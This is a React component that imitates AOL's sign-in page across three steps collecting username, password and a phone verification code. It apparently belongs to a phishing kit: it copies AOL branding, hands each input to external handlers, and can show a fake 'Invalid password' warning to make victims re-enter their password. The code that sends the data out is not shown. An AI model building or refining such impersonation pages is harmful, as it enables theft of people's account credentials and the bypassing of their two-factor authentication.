import React from 'react';
import { ShieldCheck, ArrowLeft } from 'lucide-react';
import './AolLoginPage.css';

const AolSvgLogo = ({ size = 40, className = "" }) => (
  <svg className={className} id="Layer_1" fill="currentColor" width={size} height={size * 0.4}
    xmlns="http://www.w3.org/2000/svg" viewBox="0 0 122.88 48.6">
    <path d="M66.92,10.65c12.93,0,19.14,10.23,19.14,19s-6.21,19-19.14,19-19.15-10.22-19.15-19,6.21-19,19.15-19Zm0,28a8.68,8.68,0,0,0,8.51-9,8.53,8.53,0,1,0-17,0,8.69,8.69,0,0,0,8.52,9ZM92.07,0h10.78V47.61H92.07V0Zm23.65,33.62a7.16,7.16,0,1,0,7.16,7.16,7.17,7.17,0,0,0-7.16-7.16ZM28.34,0H18.75L0,47.61H12.71l2.51-6.88H31.75l2.32,6.88H46.9L28.34,0ZM18.56,31.07l5-16.6,5,16.6Z" />
  </svg>
);

const Spinner = () => (
  <svg className="animate-spin h-5 w-5" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z" />
  </svg>
);

export default function AolLoginPage({
  email, password, otp, formStep,
  isSubmitting, emailError, pwWarning, otpError,
  onInputChange, onContinue, onPasswordSubmit, onOtpSubmit, onOtpChange,
  onBack, onClose, hint,
}) {
  return (
    <div className="min-h-screen w-screen bg-white font-sans flex flex-col relative text-[#26282a]">
      {/* Header */}
      <div className="hidden md:flex justify-center md:justify-between items-center px-14 py-6 w-full">
        <img src="aol-logo-black-v1.png" alt="AOL" className="w-auto h-9" />

        <div className="hidden md:flex gap-4 md:gap-6 text-[12px] md:text-[13px] text-[#1878FF] font-medium">
          <button onClick={onClose} className="hover:underline cursor-pointer">Help</button>
          <a href="#" className="hover:underline">Terms</a>
          <a href="#" className="hover:underline">Privacy</a>
        </div>
      </div>

      {/* Main Content */}
      <div className="flex justify-center md:justify-end items-center px-4 py-4 w-full max-w-[1030px] min-w-[320px] mx-auto">
        <div className="w-full max-w-[360px] md:border border-gray-100 md:rounded-2xl md:shadow-[0_2px_24px_0_rgba(0,0,0,0.04)] md:px-8 py-4 md:py-10 bg-white">

          {/* Step 1 — Email */}
          {formStep === 1 && (
            <form onSubmit={onContinue} className="flex flex-col items-center">
              <img src="aol-logo-black-v1.png" alt="AOL" className="w-auto h-9 mb-14 md:mb-8" />
              <h1 className="text-[28px] font-bold text-gray-900 mb-24 md:mb-8">Sign in</h1>

              <div className="w-full mb-6 relative">
                <label htmlFor="aol-email" className="text-sm font-medium text-gray-800 absolute -top-2 left-0">Username, email, or mobile</label>
                <input
                  type="text"
                  name="email"
                  value={email}
                  onChange={onInputChange}
                  autoFocus
                  required
                  className={[
                    "w-full border-b border-gray-300 pt-3 pb-2 text-[0.82353rem] outline-none transition-colors placeholder:text-gray-500",
                    emailError ? "border-red-500" : "focus:border-[#1878FF]",
                  ].join(" ")}
                />
                {emailError && <p className="text-[13px] text-red-600 mt-2">{emailError}</p>}
              </div>

              <button
                type="submit"
                disabled={isSubmitting}
                className="w-full bg-[#1878FF] hover:bg-[#1269DB] text-white font-semibold py-3 rounded-xs text-[15px] transition-colors mb-4 flex justify-center items-center gap-2 cursor-pointer"
              >
                {isSubmitting ? <Spinner /> : "Next"}
              </button>

              <div className="w-full flex justify-center md:justify-between items-center text-md text-center md:text-left md:text-[13px] text-[#1878FF] font-semibold md:font-medium mb-12">
                <label className="hidden md:flex items-center gap-2 cursor-pointer group">
                  <input type="checkbox" className="w-[18px] h-[18px] accent-[#1878FF] cursor-pointer" defaultChecked />
                  <span className="text-[#26282a] font-normal group-hover:text-black">Stay signed in</span>
                </label>
                <a href="#" className="hover:underline">Forgot username?</a>
              </div>

              <button
                type="button"
                className="mt-24 md:mt-0 w-full border border-[#1878FF] text-[#1878FF] hover:bg-[#f0f6ff] font-semibold py-3 rounded-xs text-[15px] transition-colors cursor-pointer"
              >
                Create an account
              </button>
            </form>
          )}

          {/* Step 2 — Password */}
          {formStep === 2 && (
            <form onSubmit={onPasswordSubmit} className="flex flex-col items-center">
              <img src="aol-logo-black-v1.png" alt="AOL" className="w-auto h-8 mb-4" />

              <div className="flex flex-col items-center mb-4">
                <span className="text-sm font-medium text-gray-800">{email}</span>
              </div>

              <h1 className="text-[1.5rem] font-bold text-gray-900 w-full text-center">Enter password</h1>
              <p className="text-sm text-gray-500 mb-6">to finish sign in</p>

              <div className="w-full mb-2 relative">
                <label htmlFor="aol-password" className="text-xs font-medium text-gray-800 absolute -top-2 left-0">Password</label>
                <input
                  type="password"
                  name="password"
                  value={password}
                  onChange={onInputChange}
                  autoFocus
                  required
                  className={[
                    "w-full border-b border-gray-300 pt-2 pb-2 text-[15px] outline-none transition-colors placeholder:text-gray-500",
                    pwWarning ? "border-red-500" : "focus:border-[#1878FF]",
                  ].join(" ")}
                />
                {pwWarning && <p className="text-[13px] text-red-600 mt-2">Invalid password. Please try again.</p>}
              </div>

              <div className="w-full flex justify-start mb-6">
                <button type="button" className="text-[#1878FF] font-semibold hover:underline">Forgot password?</button>
              </div>

              <button
                type="submit"
                disabled={isSubmitting}
                className="w-full bg-[#1878FF] hover:bg-[#1269DB] text-white font-semibold py-3 rounded-xs text-[15px] transition-colors mb-4 flex justify-center items-center gap-2 cursor-pointer"
              >
                {isSubmitting ? <Spinner /> : "Next"}
              </button>

              <div className="w-full flex justify-between items-center text-[13px] text-[#1878FF] font-medium">
                <button type="button" onClick={onBack} className="hover:underline flex items-center gap-1 cursor-pointer">
                  Back
                </button>
              </div>
            </form>
          )}

          {/* Step 3 — OTP */}
          {formStep === 3 && (
            <form onSubmit={onOtpSubmit} className="flex flex-col items-center">
              <img src="aol-logo-black-v1.png" alt="AOL" className="w-auto h-8 mb-4" />

              <h1 className="text-[20px] font-bold text-gray-900 mb-2 text-center w-full">Verify your identity</h1>
              <p className="text-sm text-gray-600 mb-8 text-center px-2">
                A verification code has been sent to your phone.
              </p>

              <div className="flex justify-center mb-6">
                <div className="w-16 h-16 rounded-full bg-[#f0f6ff] flex items-center justify-center text-[#1878FF]">
                  <ShieldCheck size={32} strokeWidth={1.5} />
                </div>
              </div>

              <div className="w-full mb-6 relative">
                <label htmlFor="aol-password" className="text-xs font-medium text-gray-800 absolute -top-2 left-0">Enter code</label>
                <input
                  type="text"
                  value={otp}
                  onChange={onOtpChange}
                  inputMode="numeric"
                  autoFocus
                  required
                  className={[
                    "w-full border-b border-gray-300 pb-2 pt-2 text-[15px] outline-none transition-colors placeholder:text-gray-500",
                    otpError ? "border-red-500" : "focus:border-[#1878FF]",
                  ].join(" ")}
                />
                {otpError && <p className="text-[13px] text-red-600 mt-2">{otpError}</p>}
              </div>

              <button
                type="submit"
                disabled={isSubmitting}
                className="w-full bg-[#1878FF] hover:bg-[#1269DB] text-white font-semibold py-3 rounded-sm text-[15px] transition-colors mb-4 flex justify-center items-center gap-2 cursor-pointer"
              >
                {isSubmitting ? <Spinner /> : "Verify"}
              </button>

              <div className="w-full text-center">
                <button type="button" onClick={onClose} className="text-[13px] text-[#1878FF] font-medium hover:underline mt-2 cursor-pointer">
                  Cancel
                </button>
              </div>
            </form>
          )}
        </div>
      </div>
    </div>
  );
}
